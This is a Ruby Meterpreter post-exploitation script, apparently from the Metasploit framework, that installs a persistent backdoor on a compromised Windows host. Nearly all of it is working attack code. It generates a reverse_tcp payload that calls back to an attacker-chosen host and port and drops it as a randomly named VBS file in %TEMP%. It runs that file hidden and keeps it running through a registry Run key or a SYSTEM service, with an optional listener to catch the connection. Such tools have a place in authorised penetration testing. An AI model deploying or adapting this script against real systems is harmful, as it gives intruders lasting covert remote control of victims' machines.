# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

# Meterpreter Session
@client = client

key = "HKLM"

# Default parameters for payload
rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
delay = 5
install = false
autoconn = false
serv = false
altexe = nil
target_dir = nil
payload_type = "windows/meterpreter/reverse_tcp"
script = nil
script_on_target = nil


@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on which the system running Metasploit is listening"],
	"-i"  => [ true,   "The interval in seconds between each connection attempt"],
	"-X"  => [ false,  "Automatically start the agent when the system boots"],
	"-U"  => [ false,  "Automatically start the agent when the User logs on"],
	"-S"  => [ false,  "Automatically start the agent on boot as a service (with SYSTEM privileges)"],
	"-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"],
	"-L"  => [ true,   "Location in target host to write payload to, if none \%TEMP\% will be used."],
	"-T"  => [ true,   "Alternate executable template to use"],
	"-P"  => [ true,   "Payload to use, default is windows/meterpreter/reverse_tcp."]
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
	print_line "Meterpreter Script for creating a persistent backdoor on a target host."
	print_line(@exec_opts.usage)
	raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

# Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
	print_status("Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}")
	payload = payload_type
	pay = client.framework.payloads.create(payload)
	pay.datastore['LHOST'] = lhost
	pay.datastore['LPORT'] = lport
	return pay.generate
end

# Function for Creating persistent script
#-------------------------------------------------------------------------------
def create_script(delay,altexe,raw)
	if altexe
		vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, \
				{:persist => true, :delay => delay, :template => altexe})
	else
		vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, \
				{:persist => true, :delay => delay})
	end
	print_status("Persistent agent script is #{vbs.length} bytes long")
	return vbs
end

# Function for creating log folder and returning log path
#-------------------------------------------------------------------------------
def log_file(log_path = nil)
	#Get hostname
	host = @client.sys.config.sysinfo["Computer"]

	# Create Filename info to be appended to downloaded files
	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

	# Create a directory for the logs
	if log_path
		logs = ::File.join(log_path, 'logs', 'persistence', \
				Rex::FileUtils.clean_path(host + filenameinfo) )
	else
		logs = ::File.join(Msf::Config.log_directory, 'persistence', \
				Rex::FileUtils.clean_path(host + filenameinfo) )
	end

	# Create the log directory
	::FileUtils.mkdir_p(logs)

	#logfile name
	logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
	return logfile
end

# Function for writing script to target host
#-------------------------------------------------------------------------------
def write_script_to_target(target_dir,vbs)
	if target_dir
		tempdir = target_dir
	else
		tempdir = @client.fs.file.expand_path("%TEMP%")
	end
	tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
	fd = @client.fs.file.new(tempvbs, "wb")
	fd.write(vbs)
	fd.close
	print_good("Persistent Script written to #{tempvbs}")
	tempvbs = tempvbs.gsub(/\\/, '//')			# Escape windows pathname separators.
	file_local_write(@clean_up_rc, "rm #{tempvbs}\n")
	return tempvbs
end

# Function for setting multi handler for autocon
#-------------------------------------------------------------------------------
def set_handler(selected_payload,rhost,rport)
	print_status("Starting connection handler at port #{rport} for #{selected_payload}")
	mul = client.framework.exploits.create("multi/handler")
	mul.datastore['WORKSPACE'] = @client.workspace
	mul.datastore['PAYLOAD']   = selected_payload
	mul.datastore['LHOST']     = rhost
	mul.datastore['LPORT']     = rport
	mul.datastore['EXITFUNC']  = 'process'
	mul.datastore['ExitOnSession'] = false

	mul.exploit_simple(
		'Payload'        => mul.datastore['PAYLOAD'],
		'RunAsJob'       => true
	)
	print_good("Multi/Handler started!")
end

# Function to execute script on target and return the PID of the process
#-------------------------------------------------------------------------------
def targets_exec(script_on_target)
	print_status("Executing script #{script_on_target}")
	proc = session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
	print_good("Agent executed with PID #{proc.pid}")
	return proc.pid
end

# Function to install payload in to the registry HKLM or HKCU
#-------------------------------------------------------------------------------
def write_to_reg(key,script_on_target)
	nam = Rex::Text.rand_text_alpha(rand(8)+8)
    key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	print_status("Installing into autorun as #{key_path}\\#{nam}")
	if (key)
		registry_setvaldata("#{key_path}", nam, script_on_target, "REG_SZ")
		print_good("Installed into autorun as #{key_path}\\#{nam}")
		file_local_write(@clean_up_rc, "reg deleteval -k '#{key_path}' -v #{nam}\n")
	else
		print_error("Error: failed to open the registry key for writing")
	end
end

# Function to install payload as a service
#-------------------------------------------------------------------------------
def install_as_service(script_on_target)
	if not is_uac_enabled? or is_admin?
		print_status("Installing as service..")
		nam = Rex::Text.rand_text_alpha(rand(8)+8)
		print_status("Creating service #{nam}")
		service_create(nam, nam, "cscript \"#{script_on_target}\"")
		file_local_write(@clean_up_rc, "execute -H -f sc -a \"delete #{nam}\"\n")
	else
		print_error("Insufficient privileges to create service")
	end
end


################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i
	when "-i"
		delay = val.to_i
	when "-X"
		install = true
		key = "HKLM"
	when "-S"
		serv = true
	when "-U"
		install = true
		key = "HKCU"
	when "-A"
		autoconn = true
	when "-L"
		target_dir = val
	when "-T"
		altexe = val
	when "-P"
		payload_type = val
	end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
print_status("Running Persistance Script")
# Create undo script
@clean_up_rc = log_file()
print_status("Resource file for cleanup created at #{@clean_up_rc}")
# Create and Upload Payload
raw = create_payload(payload_type, rhost, rport)
script = create_script(delay, altexe, raw)
script_on_target = write_script_to_target(target_dir, script)

# Start Multi/Handler
if autoconn
	set_handler(payload_type, rhost, rport)
end

# Execute on target host
targets_exec(script_on_target)

# Install in registry
if install
	write_to_reg(key,script_on_target)
end

# Install as a service
if serv
	install_as_service(script_on_target)
end

